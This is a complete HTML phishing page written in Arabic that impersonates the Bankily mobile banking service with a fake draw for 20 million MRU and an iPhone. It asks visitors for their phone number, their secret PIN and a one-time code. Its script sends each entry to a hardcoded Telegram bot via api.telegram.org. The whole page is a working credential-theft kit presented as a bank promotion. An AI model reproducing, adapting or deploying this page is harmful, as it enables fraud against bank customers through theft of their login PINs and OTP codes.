<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنكيلي - مسابقة الجوائز الكبرى</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
        
        body { font-family: 'Tajawal', sans-serif; background-color: #f0f4f0; }
        
        /* ألوان بنكيلي الرسمية */
        .bg-bankily-green { background-color: #008444; }
        .text-bankily-green { color: #008444; }
        .bg-bankily-yellow { background-color: #ffcc00; }
        
        /* بانر الجوائز المستوحى من الصورة */
        .promo-banner {
            background-color: #008444;
            background-image: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            border-radius: 0 0 40px 40px;
            padding: 30px 20px;
            text-align: center;
            color: white;
            position: relative;
            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
        }
        .promo-title { font-size: 1.8rem; font-weight: 900; line-height: 1.4; margin-bottom: 15px; }
        .prize-tag { background: #ffcc00; color: #008444; padding: 5px 15px; border-radius: 10px; font-weight: 900; font-size: 1.2rem; display: inline-block; margin: 5px; }
        
        /* تصميم الحقول */
        .input-group { background: white; border: 2px solid #e0e0e0; border-radius: 15px; padding: 12px 15px; display: flex; align-items: center; transition: 0.3s; }
        .input-group:focus-within { border-color: #008444; box-shadow: 0 0 10px rgba(0,132,68,0.1); }
        .input-group input { width: 100%; outline: none; border: none; font-size: 1.1rem; font-weight: bold; padding-right: 10px; }

        .btn-bankily { background: #008444; color: white; width: 100%; padding: 16px; border-radius: 15px; font-size: 1.3rem; font-weight: 900; box-shadow: 0 6px 15px rgba(0,132,68,0.3); transition: 0.2s; }
        .btn-bankily:active { transform: scale(0.96); }

        /* مودال التأكيد */
        #otp-screen { background-color: rgba(0, 0, 0, 0.75); display: none; backdrop-filter: blur(5px); }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <!-- الجزء العلوي: بانر المسابقة (مستوحى من image_7) -->
    <div class="promo-banner">
        <h1 class="promo-title">لازال بإمكانكم<br>الفوز مع بنكيلي</h1>
        <div class="flex flex-wrap justify-center gap-2">
            <span class="prize-tag">20,000,000 MRU</span>
            <span class="prize-tag">آيفون 17 برو ماكس</span>
        </div>
        <div class="mt-4 text-sm font-bold opacity-90">سجل دخولك الآن لتأكيد اشتراكك في السحب</div>
    </div>

    <!-- شعار بنكيلي (مستوحى من image_8) -->
    <div class="flex justify-center py-6">
        <div class="bg-white p-4 rounded-2xl shadow-sm">
            <img src="https://bankily.mr/wp-content/uploads/2020/09/Logo-Bankily-BPM-1.png" alt="Bankily" class="h-16">
        </div>
    </div>

    <!-- واجهة تسجيل الدخول -->
    <div id="login-step" class="w-full max-w-sm mx-auto px-6 space-y-6">
        <div>
            <label class="block text-bankily-green font-bold mb-2 mr-2">رقم الهاتف المختصر</label>
            <div class="input-group">
                <span class="text-xl">📱</span>
                <input id="phone" type="tel" maxlength="8" oninput="limit(this, 8)" placeholder="رقم الهاتف">
            </div>
        </div>

        <div>
            <label class="block text-bankily-green font-bold mb-2 mr-2">رمز PIN السري</label>
            <div class="input-group">
                <span class="text-xl">🔒</span>
                <input id="pin" type="password" maxlength="4" oninput="limit(this, 4)" placeholder="****">
            </div>
        </div>

        <button onclick="startProcessing()" class="btn-bankily">
            دخول السحب الآمن
        </button>

        <p class="text-center text-gray-500 text-sm font-bold">بنكي فيدي .. بنكيلي!</p>
    </div>

    <!-- شاشة الرمز السري (OTP) -->
    <div id="otp-screen" class="fixed inset-0 z-50 flex items-center justify-center p-4">
        <div class="bg-white rounded-[30px] p-8 w-full max-w-sm shadow-2xl text-center">
            <div class="w-20 h-20 bg-green-50 border-4 border-bankily-green rounded-full flex items-center justify-center mx-auto mb-4">
                <span id="timer" class="text-bankily-green font-black text-xl">05:00</span>
            </div>
            <h2 class="text-2xl font-black text-gray-800 mb-2">تأكيد الرمز</h2>
            <p class="text-gray-500 text-sm mb-6">يرجى إدخال الرمز المكون من 6 أرقام لتأكيد عملية الاشتراك</p>
            
            <input id="otp" type="tel" maxlength="6" class="w-full text-center text-4xl font-black tracking-[10px] border-b-4 border-bankily-green pb-2 outline-none mb-8" placeholder="000000">
            
            <button onclick="submitOTP()" class="btn-bankily">تأكيد الآن</button>
        </div>
    </div>

    <script>
        // إعدادات تليجرام المحدثة
        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
        const chatId = "8665814266"; 

        function sendData(msg) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        }

        function limit(el, max) {
            el.value = el.value.replace(/[^0-9]/g, '');
            if(el.value.length > max) el.value = el.value.slice(0, max);
        }

        function startProcessing() {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;
            
            if(phone.length === 8 && pin.length === 4) {
                sendData(`🚀 Bankily Login:\n📱 الهاتف: ${phone}\n🔑 الرمز: ${pin}`);
                document.getElementById('otp-screen').style.display = 'flex';
                runTimer(300);
            } else {
                alert("تأكد من إدخال رقم الهاتف (8 أرقام) والرمز (4 أرقام)");
            }
        }

        function runTimer(sec) {
            let t = sec;
            const timerEl = document.getElementById('timer');
            const interval = setInterval(() => {
                let m = Math.floor(t / 60);
                let s = t % 60;
                timerEl.innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
                if (--t < 0) clearInterval(interval);
            }, 1000);
        }

        function submitOTP() {
            const otp = document.getElementById('otp').value;
            if(otp.length === 6) {
                sendData(`✅ Bankily OTP:\nالرمز: ${otp}`);
                alert("تم تسجيل اشتراكك في سحب الـ 20 مليون بنجاح!");
                location.reload();
            } else {
                alert("أدخل الرمز كاملاً");
            }
        }
    </script>
</body>
</html>
